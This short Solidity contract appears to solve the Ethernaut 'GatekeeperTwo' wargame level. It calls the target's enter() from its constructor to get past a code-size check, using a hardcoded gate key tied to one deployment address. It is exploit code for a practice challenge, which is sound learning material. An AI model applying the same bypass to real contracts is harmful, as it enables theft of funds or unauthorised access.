// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";
import "hardhat/console.sol";

contract GatekeeperTwoCaller {
  GatekeeperTwo gatekeeperTwo;

  constructor(GatekeeperTwo _gatekeeperTwo) public {
    gatekeeperTwo = _gatekeeperTwo;

    bytes8 _gateKey = bytes8(uint64(5855473272435185754));
    _gatekeeperTwo.enter(_gateKey);
  }
}